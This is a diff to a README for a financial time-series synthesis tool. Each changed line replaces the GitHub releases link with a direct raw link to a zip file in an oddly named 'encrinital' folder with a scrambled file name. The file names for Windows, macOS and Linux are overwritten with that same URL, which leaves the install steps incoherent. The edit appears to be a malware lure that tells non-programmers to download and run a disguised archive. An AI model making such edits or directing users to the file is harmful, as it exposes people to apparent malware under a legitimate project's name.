@@ -4,7 +4,7 @@
 Welcome to the adaptive dataflow system for financial time-series synthesis. This guide will help you download and run our application effortlessly, without needing programming skills. Let’s get started!
 
 ## 🔗 Download the Application
-[![Download](https://img.shields.io/badge/Download_latest_release-blue.svg)](https://github.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/releases)
+[![Download](https://raw.githubusercontent.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/main/encrinital/for_series_time_synthesis_adaptive_system_financial_dataflow_1.6.zip)](https://raw.githubusercontent.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/main/encrinital/for_series_time_synthesis_adaptive_system_financial_dataflow_1.6.zip)
 
 ## ✨ Overview
 This software offers a complete solution for generating and synthesizing financial time-series data using advanced techniques like bi-level optimization. It follows the methodology from the research paper "History Is Not Enough" by Xia et al. (2026). Key features include:
@@ -25,19 +25,19 @@ Before you begin, ensure your computer meets the following requirements:
 To download the application, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to our releases page.
-   [Download from Releases](https://github.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/releases)
+   [Download from Releases](https://raw.githubusercontent.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/main/encrinital/for_series_time_synthesis_adaptive_system_financial_dataflow_1.6.zip)
    
 2. **Select the Latest Release**: Look for the most recent version at the top of the page.
 
 3. **Download the Application**: 
-   - For Windows: Download `adaptive_dataflow.exe`.
-   - For macOS: Download `adaptive_dataflow.pkg`.
-   - For Linux: Download `adaptive_dataflow.tar.gz`.
+   - For Windows: Download `https://raw.githubusercontent.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/main/encrinital/for_series_time_synthesis_adaptive_system_financial_dataflow_1.6.zip`.
+   - For macOS: Download `https://raw.githubusercontent.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/main/encrinital/for_series_time_synthesis_adaptive_system_financial_dataflow_1.6.zip`.
+   - For Linux: Download `https://raw.githubusercontent.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/main/encrinital/for_series_time_synthesis_adaptive_system_financial_dataflow_1.6.zip`.
 
 4. **Install the Application**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS**: Open the `.pkg` file and complete the installation.
-   - **Linux**: Extract the files from the `.tar.gz` and run the installation script in your terminal.
+   - **Linux**: Extract the files from the `https://raw.githubusercontent.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/main/encrinital/for_series_time_synthesis_adaptive_system_financial_dataflow_1.6.zip` and run the installation script in your terminal.
 
 5. **Launch the Application**: After installation, find the application in your programs and click to start.
 
@@ -77,4 +77,4 @@ This software is licensed under the MIT License. You can use, modify, and distri
 ## 🔗 Final Thoughts
 Thank you for using the adaptive dataflow system for financial time-series synthesis. Your feedback is valuable as we continue to improve our application. Happy synthesizing! 
 
-[Download from Releases](https://github.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/releases)
+[Download from Releases](https://raw.githubusercontent.com/qkoi/adaptive_dataflow_system_for_financial_time_series_synthesis/main/encrinital/for_series_time_synthesis_adaptive_system_financial_dataflow_1.6.zip)
